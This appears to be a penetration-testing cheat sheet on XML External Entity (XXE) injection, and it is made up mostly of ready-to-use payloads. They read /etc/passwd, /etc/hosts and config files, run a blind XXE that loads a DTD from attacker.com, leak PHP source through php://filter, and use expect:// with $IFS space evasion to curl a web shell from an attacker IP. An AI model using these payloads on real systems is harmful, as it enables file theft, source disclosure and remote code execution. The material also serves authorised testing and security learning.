# XXE

### 1) Identification

XXE vulnerabilities occur when an application parses XML input from untrusted sources and processes external entities. An attacker can manipulate the XML content to read sensitive files from the system; these are the parts of the XML file.

### 2) Local File Disclosure

In this case data is being sent in the XML, so we can change it and test different variables (&[variable];) to display information.

<img width="1476" height="570" alt="image" src="https://github.com/user-attachments/assets/33b3e4f7-d16d-411b-aa1d-3a1cf78e2664" />

<img width="1260" height="574" alt="image" src="https://github.com/user-attachments/assets/3ebb3012-cd2e-4b78-8d9b-fa696d185ca3" />

### 2) Reading sensitive files

Consider that in certain Java web applications, we may also be able to specify a directory instead of a file, and we will get a directory listing instead, which can be useful for locating sensitive files.

#### /etc/passwd

    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
       <!ELEMENT foo ANY >
       <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
    <foo>&xxe;</foo>

One liner in a parameter

    <%3fxml+version%3d"1.0"%3f><!DOCTYPE+root+[<!ENTITY+test+SYSTEM+'file%3a///etc/passwd'>]><root><user>%26test%3b</user></root>

#### Read a custom file

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE config [
       <!ELEMENT config ANY >
       <!ENTITY readConfig SYSTEM "file:///etc/myconfig.conf" >]>
    <config>&readConfig;</config>

#### Accessing local files

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE data [
       <!ELEMENT data ANY >
       <!ENTITY localHosts SYSTEM "file:///etc/hosts" >]>
    <data>&localHosts;</data>

#### Blind XXE

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE request [
       <!ENTITY % remote SYSTEM "http://attacker.com/malicious.dtd">
       <!ENTITY % all "<!ENTITY send SYSTEM 'file:///etc/passwd'>">
       %remote;
       %all;
    ]>
    <request>&send;</request>

#### XXE with Network Access

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE request [
       <!ELEMENT request ANY >
       <!ENTITY xxe SYSTEM "http://attacker.com/secret.txt" >]>
    <request>&xxe;</request>

### 3) Read Source Code

In this case we need to be careful because if we are referencing something that is not in proper XML format the External XML Entity vulnerability will not work, this can happens if the file contains XML special characters (eg. | < > { } &); for these cases we could base64 encode them. 

    <!DOCTYPE email [
      <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
    ]>

<img width="1536" height="317" alt="image" src="https://github.com/user-attachments/assets/2e968743-a66a-47fe-9bf6-d90f03c2a9ca" />

### 4) Remote Code Execution

In this case we need to be careful with special characters (| < > { } &) as well, as they will break our command, you could even consider encode them. For case see that in example below we replaced all spaces in the above XML code with $IFS, to avoid breaking the XML syntax.
Another trick to use for RCE is URL encoding the \n character (newline) with %0a. 

Example command you can use to test is: %0als

        <?xml version="1.0"?>
        <!DOCTYPE email [
          <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
        ]>
        <root>
        <name></name>
        <tel></tel>
        <email>&company;</email>
        <message></message>
        </root>
